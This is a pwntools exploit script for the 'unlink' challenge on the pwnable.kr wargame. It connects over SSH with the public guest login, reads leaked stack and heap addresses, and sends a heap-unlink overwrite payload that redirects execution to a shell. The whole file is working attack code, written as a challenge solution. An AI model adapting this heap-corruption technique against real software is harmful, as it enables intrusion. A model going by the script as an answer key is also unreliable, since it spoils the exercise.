from pwn import *


def exploit():
    s = ssh(user='unlink', host='pwnable.kr', password='guest', port=2222)
    p = s.process(executable='./unlink')
    p.recvuntil('leak: ')
    stack_addr = p.recvline().strip()
    print(stack_addr)
    p.recvuntil('leak: ')
    heap_addr = p.recvline().strip()
    print(heap_addr)
    heap_offset = 12
    heap_addr = struct.pack("<I", int(heap_addr, 16) + heap_offset)
    stack_offset = 16
    stack_addr = struct.pack("<I", int(stack_addr, 16) + stack_offset)
    sh_addr = p32(0x080484eb)
    payload = sh_addr + b'\x90' * heap_offset + heap_addr + stack_addr
    p.sendline(payload)
    p.interactive()


if __name__=='__main__':
    exploit()
